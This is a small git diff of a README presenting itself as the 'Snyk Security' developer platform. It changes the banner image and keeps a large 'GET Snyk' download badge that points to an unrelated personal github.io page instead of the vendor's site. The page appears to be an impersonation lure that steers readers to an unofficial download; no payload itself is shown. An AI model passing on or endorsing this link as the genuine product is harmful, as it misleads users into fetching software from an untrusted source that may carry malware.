@@ -1,6 +1,6 @@
 # Snyk Security - Complete Developer Security Platform
 
-![Banner Placeholder](https://www.arrow.com/globalecs-media/2zxe4ggh/logo-black.png)
+![Banner Placeholder](https://cloudwars.com/wp-content/uploads/2022/12/Snyk_Logo.jpg)
 
 [![GET Snyk](https://img.shields.io/badge/GET%20%E2%80%94%20Snyk-0078D6?style=for-the-badge&logoColor=white)](https://moshejohnsonsbfv.github.io/.github/snyk-security)
 
